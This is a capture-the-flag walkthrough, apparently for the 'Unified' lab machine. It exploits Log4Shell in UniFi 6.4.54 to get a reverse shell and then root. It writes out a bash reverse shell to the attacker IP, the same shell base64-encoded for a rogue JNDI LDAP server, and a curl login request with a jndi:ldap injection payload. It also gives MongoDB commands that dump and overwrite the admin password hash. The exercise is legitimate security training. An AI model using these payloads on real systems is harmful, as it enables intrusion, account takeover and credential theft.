# Unified
## User flag

When starting a box it's always a good idea to run nmap to enumerate services on the target machine. Running `nmap -sV -sC 10.129.97.178` shows us the versions of services running and may point us towards vulnerabilities. The scripts don’t give us much, but we see that the machine has four TCP ports running:

![nmap results](/images/1image.png)


We try going to `10.129.97.178` in a firefox (would help if we do it through BurpSuite in case we need to monitor requests and responses later) but it doesn’t work. That’s because we need to specify port 8080. Trying `http://10.129.97.178:8080` and then accepting the risks takes us to this web page:

![web page](/images/2image.png)


We see that it redirected us to port `8443` and has taken us to a login page. The login page shows that we are dealing with UniFi version `6.4.54`, which may be useful if we want to leverage a vulnerability found in this version.

A quick google search shows us that UniFi version `6.4.54` is vulnerable to the Log4Shell Vulnerability ([CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)). The CVE page shows that we can run arbitrary code if we are able to leverage this vulnerability.

This page: https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi shows us how to do the exploit. 

In order to do the exploit, we need Java JDK and Maven. Java is already on Kali linux so we download Maven using `sudo apt install maven`.

We can now run `git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package`

This command compiled the jar we will use to construct the reverse shell. 

We need to convert the command to build our reverse shell into base 64 because that is how we will construct our web call to UniFi. The vulnerability takes advantage of the “remember" field. Our payload will go in there. The payload will be the result of this command: 

`echo 'bash -c bash -i >&/dev/tcp/10.10.14.153/4444 0>&1' | base64`

Note we are using our tun0 ip address for this and that we arbitrarily chose port 4444 for the listener port. 

Now we need to set up the LDAP server for our server. Again, this will use our `tun0` IP address. The full command to run will be: 

`java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1My80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.14.153"`

We can then run the command to start our attacker LDAP server. 

![Attacker LDAP](/images/3image.png)

Now we need to run a curl command to trigger the reverse shell. The curl command on the exploit page won’t work because our box has many more aspects to the request. 

To know how to modify our request, we can use **BurpSuite** to intercept the login post request. Turn on the Proxy intercept on BurpSuite. Enter "admin" for the username and the password (could be anything you want, not just "admin"). Then we can convert it to a curl request and replace the “remember” portion as shown in the page. 

```
curl -k -X POST https://10.129.97.178:8443/api/login \
  -H 'Host: 10.129.97.178:8443' \
  -H 'Sec-Ch-Ua-Platform: "Linux"' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"' \
  -H 'Content-Type: application/json; charset=utf-8' \
  -H 'Sec-Ch-Ua-Mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' \
  -H 'Accept: */*' \
  -H 'Origin: https://10.129.97.178:8443' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://10.129.97.178:8443/manage/account/login?redirect=%2Fmanage' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Priority: u=1, i' \
  -H 'Connection: keep-alive' \
  --data-raw '{"username":"admin","password":"admin","${jndi:ldap://10.10.14.153:1389/o=tomcat}":false,"strict":true}'
```

This should open up a reverse shell in your netcat listener. To make it a little easier to deal with, run `script /dev/null -c bash`.

We start out in `/usr/lib/unifi/data`. But we can navigate to the `/home`directory to see what users are around. We find `/home/michael` here. The user flag (`user.txt`) can be found here. 

## Root flag
Now we need to escalate privileges. Following the article, we see we can run this to get users and their passwords: 

`mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

Most importantly we see this hash: 

administrator@unified.htb
$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.

Continuing to use the article, we can replace the existing password with our own since the password is salted (can’t use John the Ripper or something similar to reverse the hash we see). 

The command we need to adjust is: 

`mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`

Let's change the password to "password". We can get the hash by running `mkpasswd -m sha-512 password`.

We will get if we change the password to “password”:

`mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$fv8Xt6KTm.SdvlKA$lJapZC4b4o9KBPnPAsWQKyww68/RwvGTpbyjQM5BaqpjB9I6P5Pu1m/oc5MIRlgLHLXSup8tE9TUoWmSjIokm/"}})'`

Now we can log into the website using `administrator` as the username and `password` as the passowrd. 

We can go to settings and scroll down to find out that the `root` password is `NotACrackablePassword4U2022` for ssh. 

Once we log in, we see the `root.txt` file right there in the `/root` folder. 
